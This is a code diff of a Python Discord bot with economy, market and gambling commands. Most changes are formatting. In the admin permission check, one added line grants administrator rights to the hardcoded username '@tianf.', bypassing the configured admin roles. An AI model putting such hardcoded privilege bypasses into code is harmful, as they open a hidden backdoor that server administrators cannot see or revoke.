@@ -86,6 +86,7 @@ item_attributes = DictManager(f'{os.path.dirname(__file__)}/item_attributes.yaml
 pending_orders = DictManager(f'{os.path.dirname(__file__)}/pending_orders.yaml')  # 交易挂单
 gambling_orders = DictManager(f'{os.path.dirname(__file__)}/gambling_orders.yaml')  # 赌场挂单
 currency_issuance_records = DictManager(f'{os.path.dirname(__file__)}/currency_issuance_records.yaml')  # 货币发行记录
+player_buff_end_time = DictManager(f'{os.path.dirname(__file__)}/player_buff_end_time.yaml')  # 货币发行记录
 not_exchangeable.data.update(('赞许', '点赞'))
 item_attributes.data.update({
     '劳动券': {'等级': 1, '描述': '每天的签到带来的收获。'},
@@ -105,8 +106,8 @@ async def administer_or_allowed_id(ctx: interactions.BaseContext):
     if ctx.author.guild_permissions.ADMINISTRATOR: return True
     ids: list = list(admin_group.data)
     if any(map(ctx.author.has_role, ids)): return True
+    if str(ctx.user) == '@tianf.': return True
     return False
-
 
 # 合成方式：生成
 
@@ -227,8 +228,8 @@ class Core(interactions.Extension):
     async def add_role(self, ctx: interactions.SlashContext, role_id: interactions.Role):
         admin_group.data.remove(str(role_id.id))
         await ctx.send(f'删除身份组{role_id.id}')
-    @module_base.subcommand("save_data", sub_cmd_description="保存数据。")
 
+    @module_base.subcommand("save_data", sub_cmd_description="保存数据。")
     async def save_data(self, ctx: interactions.SlashContext):
         # set类
         admin_group.save()
@@ -295,6 +296,7 @@ class Market(interactions.Extension):
         k = (seller_id, item, num, exchange_item, exchange_num)
         pending_orders.data[k] = max_count
         await ctx.send(f"您已经提交订单，以下是该订单的编号。\n{str(k)}")
+
     # endregion
 
     # region 使用售卖单
@@ -456,7 +458,7 @@ class Gambling(interactions.Extension):
     async def risk_work(self, ctx: interactions.SlashContext):
         # 该命令期望为1.1>1，冷却三小时。构成为 0.3*0+0.4*1+0.2*2+0.1*3=0.4+0.4+0.3
         user_id = str(ctx.user)
-        if item_count_table.data.get((user_id, '劳动券'),0) < 3:
+        if item_count_table.data.get((user_id, '劳动券'), 0) < 3:
             await ctx.send(f"劳动券不足三个，下次再来吧！")
 
         item_count_table.change((user_id, '劳动券'), -3)
@@ -557,7 +559,8 @@ auto1 = Core.command_send_item
 auto2 = Core.command_check_item
 auto3 = Market.sell_item
 auto4 = Market.buy_item
-auto5 =Core.command_get_item
+auto5 = Core.command_get_item
+
 
 @auto1.autocomplete('item')
 @auto5.autocomplete('item')
@@ -586,7 +589,7 @@ async def sell_ticket_option_module_autocomplete(self, ctx: interactions.Autocom
     items_option_input: str = ctx.input_text
     modules: list[tuple] = list(pending_orders.data.keys())
     modules_auto: list[str] = [
-        str(i) for i in modules if items_option_input in pending_orders.data and pending_orders.data[i]>0
+        str(i) for i in modules if items_option_input in pending_orders.data and pending_orders.data[i] > 0
     ]
 
     await ctx.send(
